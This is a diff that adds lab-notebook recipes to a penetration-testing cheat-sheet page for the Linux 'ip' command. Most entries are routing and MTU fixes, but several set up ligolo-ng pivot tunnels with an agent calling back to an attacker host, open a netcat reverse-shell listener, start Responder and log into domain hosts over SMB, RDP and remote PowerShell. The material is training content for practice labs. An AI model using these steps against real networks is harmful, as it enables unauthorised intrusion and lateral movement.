@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=ip) · [All tools](/index)
+
 ## Commands
 
 **Kali/Linux**
@@ -22,8 +24,275 @@ ip route
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=ip%20addr)
+## Notebook recipes
 
-## Learning and original examples
+20 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Pivoting Fundamentals: Routes, SOCKS, and Forwards](/pivoting/fundamentals)
+<AccordionGroup>
+
+<Accordion title="Check the route to the DC">
+
+### Check the route to the DC
+
+**AD Lab Guide — Full Reference**
+
+```bash
+ip route get {{dcIp}}
+```
+
+</Accordion>
+
+<Accordion title="Inspect the target route">
+
+### Inspect the target route
+
+**AD Lab Guide — Full Reference**
+
+```bash
+ip route get {{target}}
+```
+
+</Accordion>
+
+<Accordion title="Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)">
+
+### Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# Kali
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
+sudo ./proxy -selfcert            # listens :11601
+# DMZ01
+./agent -connect <KALI>:11601 -ignore-cert
+# Kali (in proxy console type `start`, then add the route)
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now tools work WITHOUT proxychains:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+```
+
+</Accordion>
+
+<Accordion title="Accessing DC03 Using Enter-PSSession">
+
+### Accessing DC03 Using Enter-PSSession
+
+**Cross-Forest Trusts - Windows**
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
+inlanefreight\administrator
+
+[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
+   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
+```
+
+</Accordion>
+
+<Accordion title="6. Networking / pentest quick commands">
+
+### 6. Networking / pentest quick commands
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+ip a                # show interfaces & IPs (replaces ifconfig)
+ip a show tun0      # just the VPN interface (HTB/CPTS uses tun0)
+ip route            # routing table
+ss -tulpn           # listening ports (replaces netstat)
+ping -c 4 10.10.10.10
+curl -s http://target/ | less       # fetch a page
+curl -I http://target/               # headers only
+wget http://target/file              # download a file
+nc -lvnp 4444       # netcat listener (catch reverse shells)
+python3 -m http.server 80            # quick web server to transfer files
+```
+
+</Accordion>
+
+<Accordion title="6. Create the TUN interface">
+
+### 6. Create the TUN interface
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip tuntap add user "$USER" mode tun ligolo
+sudo ip link set ligolo up
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+ip addr show ligolo
+```
+
+</Accordion>
+
+<Accordion title="9. Add the route on Kali">
+
+### 9. Add the route on Kali
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip route add AD_SUBNET dev ligolo
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip route add 10.10.10.0/24 dev ligolo
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+ip route
+```
+
+</Accordion>
+
+<Accordion title="Cleanup">
+
+### Cleanup
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip route del AD_SUBNET dev ligolo
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip route del 10.10.10.0/24 dev ligolo
+```
+
+**Ligolo-ng Setup and BloodHound Collection**
+
+```bash
+sudo ip link delete ligolo
+```
+
+</Accordion>
+
+<Accordion title="Ligolo-ng: Quick Reference">
+
+### Ligolo-ng: Quick Reference
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+# Attacker (once)
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# Victim (agent) connects back
+./agent -connect ATTACKER:11601 -ignore-cert
+```
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+# In the ligolo proxy console
+session            # pick the agent
+# Then on the attacker box: add a route to the internal subnet via ligolo
+sudo ip route add 172.16.5.0/24 dev ligolo
+# now reach hosts directly
+nxc smb 172.16.5.19
+```
+
+</Accordion>
+
+<Accordion title="Troubleshooting log (everything that bit me, and the fix)">
+
+### Troubleshooting log (everything that bit me, and the fix)
+
+**Pass the Certificate: PKINIT and Lab Walkthrough**
+
+```bash
+sudo ip link set dev tun0 mtu 1200      # drop further to 1100 if needed
+```
+
+</Accordion>
+
+<Accordion title="3. ligolo‑ng (transparent TUN — best for RDP/scanning)">
+
+### 3. ligolo‑ng (transparent TUN — best for RDP/scanning)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# Kali — one-time interface setup
+sudo ip tuntap add user kali mode tun ligolo
+sudo ip link set ligolo up
+# Kali — start the proxy (listens on 11601)
+sudo ./proxy -selfcert
+# pivot host — run the agent (upload it first)
+./agent -connect <KALI_IP>:11601 -ignore-cert
+# Kali — in the ligolo console:
+session            # pick the agent
+start              # activate the tunnel
+# Kali — route the internal subnet through ligolo
+sudo ip route add 172.16.119.0/24 dev ligolo
+# now everything just works:
+nxc smb 172.16.119.11 -u user -p pass
+xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
+nmap -sT 172.16.119.0/24
+```
+
+</Accordion>
+
+<Accordion title="🚨 THE MTU TRAP">
+
+### 🚨 THE MTU TRAP
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+sudo ip link set dev tun0 mtu 1200      # drop to 1100 if still flaky
+```
+
+</Accordion>
+
+<Accordion title="Responder — Interface and Startup">
+
+### Responder — Interface and Startup
+
+**Responder — Interface and Startup**
+
+```bash
+ip -br addr
+responder --help
+```
+
+</Accordion>
+
+<Accordion title="🚨 GLOBAL CAVEATS (the stuff that wasted hours)">
+
+### 🚨 GLOBAL CAVEATS (the stuff that wasted hours)
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: SSH/PKINIT/LDAPS  connects then hangs , or "Connection reset by peer", while ping/ nc -z  work VPN MTU  — large packets fragment & drop; small ones pass sudo ip link set dev tun0 mtu 1200
+
+```text
+sudo ip link set dev tun0 mtu 1200
+```
+
+</Accordion>
+
+</AccordionGroup>
